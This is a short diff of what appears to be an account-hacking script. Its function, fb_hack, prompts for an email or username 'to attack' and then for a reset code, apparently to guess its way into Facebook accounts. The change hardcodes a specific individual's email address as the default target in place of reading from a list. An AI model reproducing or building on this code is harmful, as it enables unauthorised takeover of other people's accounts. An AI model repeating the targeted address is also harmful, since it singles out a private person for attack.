@@ -206,7 +206,7 @@ def fb_hack(email, codex):
 os.system('clear')
 passcode6()
 f = open("emails.txt", "r")
-ehack = input('Email address or username to attack:') or f.readlines(-1)
+ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
 f.close()
 reset = int(input('Code: ') or 99999999)
 reset1 = reset
